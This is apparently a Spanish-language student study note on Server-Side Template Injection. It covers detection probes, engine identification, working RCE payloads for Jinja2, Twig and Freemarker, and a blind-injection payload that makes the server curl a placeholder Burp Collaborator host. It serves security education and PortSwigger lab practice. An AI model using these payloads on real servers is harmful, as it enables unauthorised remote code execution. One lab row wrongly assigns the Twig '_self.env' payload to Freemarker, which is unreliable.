

> [!info] Relacionado con
> [[SSRF — Server-Side Request Forgery]] · [[Vulnerabilidades Web — OWASP Top 10 y Burp Suite]] · [[Burp Suite - Framework de Auditoría]] · [[OWASP Top 10 - CVE CVSS CWE]]

---

## ① Definición

**SSTI (Server-Side Template Injection)** = inyectar código en motores de plantillas del servidor, ejecutando código arbitrario del lado del servidor.

> [!important] SSTI es la escalada más directa a RCE
> A diferencia de otras inyecciones que dependen del contexto, SSTI te da **ejecución remota de código** (RCE) directamente. Si el servidor renderiza tu input en una plantilla, tienes control total.

---

## ② Detección

### Test básico

```
{{7*7}} → Si la respuesta es 49 → SSTI confirmado
{{7*'7'}} → Si es 49 o 7777777 → motor confirmado
```

> [!tip] Diferenciar de XSS
> Si ves el resultado `49` **renderizado** en la página, es SSTI. Si ves `{{7*7}}` como texto plano, no está procesando plantillas. Si ves una alerta de JavaScript, es XSS normal.

---

## ③ Identificación del motor

| Payload | Motor |
|---------|-------|
| `{{7*7}}` → 49 | Jinja2 (Python), Twig (PHP), Freemarker |
| `${7*7}` → 49 | Freemarker (Java) |
| `<%= 7*7 %>` → 49 | ERB (Ruby) |
| `#{7*7}` → 49 | Slim (Ruby) |

### Diferenciar Jinja2 vs Twig vs Freemarker

```
{{7*'7'}} → 49 → Jinja2 (string repeat)
{{7*'7'}} → 7777777 → Twig (concatenación)
```

> [!warning] No adivinar: probar
> Siempre enviar payloads de ambos motores y ver cuál responde. No asumas el motor por el lenguaje del backend (PHP no garantiza Twig).

---

## ④ RCE por motor

### Jinja2 (Python)

```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

### Twig (PHP)

```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

### Freemarker (Java)

```java
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
```

> [!tip] PayloadsAllTheThings y HackTricks
> Ten listas completas de payloads por motor. No los memorices: entiende la **cadena de acceso a objetos** que cada motor expone.

---

## ⑤ Blind SSTI

Cuando no ves el output directamente (sin renderizado).

### Detección con Collaborator

```
{{config.__class__.__init__.__globals__['os'].popen('curl http://YOUR-COLLAB.burpcollaborator.net').read()}}
```

1. Crear Collaborator
2. Inyectar payload con HTTP request al Collaborator
3. Si aparece hit → SSTI confirmado aunque no veas el output

---

## ⑥ Labs cubiertos

| Lab | Motor | Desafío |
|-----|-------|---------|
| **Jinja2 básico** | Jinja2 | SSTI directo con `{{7*7}}` |
| **Jinja2 sin config** | Jinja2 | Sin acceso a `config` → usar alternativas |
| **Freemarker** | Freemarker | Payload con `_self.env` |
| **Code output** | Varios | SSTI donde el output se refleja parcialmente |

> [!note] PortSwigger Web Security Academy
> Practica todos los labs de SSTI. Son el mejor recurso para entender la escalada desde detección hasta RCE completo.

---

## ⑦ SSTI vs otras inyecciones

| Inyección | Input | Output | Impacto |
|-----------|-------|--------|---------|
| **SQLi** | Consultas SQL | Datos de BD | Lectura/escritura de datos |
| **XSS** | JavaScript | HTML en navegador | Robo de cookies, sesión |
| **SSTI** | Template code | Código ejecutado en servidor | **RCE completo** |
| **Command Injection** | Comandos OS | Salida del sistema | RCE, pero más filtrado |

> [!important] Diferencia clave
> SSTI es **más peligrosa que XSS** porque ejecuta en el servidor, no en el navegador. Y es **más fácil que Command Injection** porque los motores de plantillas están diseñados para ejecutar código.

---

## ⑧ Herramientas

| Herramienta | Objetivo |
|------------|----------|
| **Burp Suite (Repeater)** | Enviar payloads SSTI y analizar respuestas |
| **PayloadsAllTheThings** | Repo de payloads por motor de plantillas |
| **HackTricks** | Guías de SSTI y payloads actualizados |
| **Burp Collaborator** | Detección de Blind SSTI |

---

## Checklist de repaso

- [ ] ¿Sé explicar qué es SSTI y por qué es más peligrosa que XSS?
- [ ] ¿Puedo detectar SSTI con el test `{{7*7}}`?
- [ ] ¿Distingo Jinja2 de Twig y Freemarker?
- [ ] ¿Tengo un payload de RCE para al menos un motor?
- [ ] ¿Sé detectar Blind SSTI con Collaborator?
- [ ] ¿He practicado los labs de PortSwigger?


---

## 🔗 Red de Conocimiento

### Documentos Relacionados

- [[../../apuntes Joselu/MODULO3/resumen_master_clase49.md|resumen_master_clase49]] — SQL Injection, SSTI, XXE
- [[XXE — XML External Entity.md|XXE — XML External Entity]] — Post-Explotación, SSTI, XXE
- [[../../apuntes Chema/OWASP Top 10, CVSS, CWE y CVE.md|OWASP Top 10, CVSS, CWE y CVE]] — Post-Explotación, SQL Injection, XXE
- [[../../apuntes Andres/20.07.2026 PortSwigger SSRF.md|20.07.2026 PortSwigger SSRF]] — SQL Injection, SSTI, XXE
- [[../../apuntes Andres/21.07.2026 PortSwigger Cierre SSRF + Introduccion SSTI.md|21.07.2026 PortSwigger Cierre SSRF + Introduccion SSTI]] — SQL Injection, SSTI, XXE
- [[../../apuntes Andres/29.06.2026 Vulnerabilidades Web OWASP Top 10 y Reconocimiento Web.md|29.06.2026 Vulnerabilidades Web OWASP Top 10 y Reconocimiento Web]] — SQL Injection, SSTI, XXE

### 🛠️ Herramientas

- [[comandos/BurpSuite|Burp Suite]]
- [[comandos/Metasploit|Netcat / Reverse Shells]]

### 🎯 Vulnerabilidades Relacionadas

- [[Apuntes/06 - Explotacion y Post-Explotacion/Reverse Shells y Post-Explotación.md|Command Injection / RCE]]
- [[Apuntes/05 - Auditoria Web/SQL Injection.md|SQL Injection]]
- [[Apuntes/05 - Auditoria Web/SSRF — Server-Side Request Forgery.md|SSRF]]
- [[Apuntes/05 - Auditoria Web/Vulnerabilidades Web — OWASP Top 10 y Burp Suite.md|XSS]]
- [[Apuntes/05 - Auditoria Web/XXE — XML External Entity.md|XXE]]

> #burpsuite #command-injection #netcat #post-explotacion #redes #reverse-shell #sqli #ssrf #ssti #xss #xxe
